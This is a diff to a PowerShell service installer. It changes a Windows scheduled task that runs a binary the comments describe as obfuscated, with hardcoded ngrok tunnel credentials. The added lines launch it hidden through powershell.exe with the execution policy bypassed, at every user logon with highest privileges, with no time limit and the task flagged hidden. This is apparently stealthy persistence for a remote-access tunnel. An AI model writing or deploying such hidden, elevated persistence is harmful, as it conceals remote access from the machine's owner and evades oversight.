@@ -52,23 +52,29 @@ if ($IsWindows) {
         Unregister-ScheduledTask -TaskName $ServiceName -Confirm:$false
     }
     
-    # Create scheduled task action (obfuscated binary has hardcoded ngrok credentials)
-    $action = New-ScheduledTaskAction -Execute $binaryPath -WorkingDirectory (Split-Path $binaryPath)
+    # Get current user
+    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
     
-    # Create trigger for startup
-    $trigger = New-ScheduledTaskTrigger -AtStartup
+    # Create scheduled task action with hidden window (obfuscated binary has hardcoded ngrok credentials)
+    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command `"& '$binaryPath'`"" -WorkingDirectory (Split-Path $binaryPath)
     
-    # Create principal with highest privileges
-    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+    # Create trigger for user logon
+    $trigger = New-ScheduledTaskTrigger -AtLogOn -User $currentUser
     
-    # Create settings
-    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
+    # Create principal using current user with highest privileges
+    $principal = New-ScheduledTaskPrincipal -UserId $currentUser -LogonType Interactive -RunLevel Highest
+    
+    # Create settings - Hidden execution, no visible windows
+    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit (New-TimeSpan -Days 0) -Hidden
     
     # Register the scheduled task
     Register-ScheduledTask -TaskName $ServiceName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description $ServiceDescription
     
     Write-Host "✓ Scheduled Task '$ServiceName' created successfully!"
-    Write-Host "  The service will start automatically on system boot."
+    Write-Host "  Running as: $currentUser"
+    Write-Host "  The service will start automatically when you log in."
+    Write-Host "  Execution: Hidden (no visible windows)"
+    Write-Host ""
     Write-Host "  To start now: Start-ScheduledTask -TaskName '$ServiceName'"
     Write-Host "  To stop: Stop-ScheduledTask -TaskName '$ServiceName'"
     Write-Host "  To remove: Unregister-ScheduledTask -TaskName '$ServiceName'"
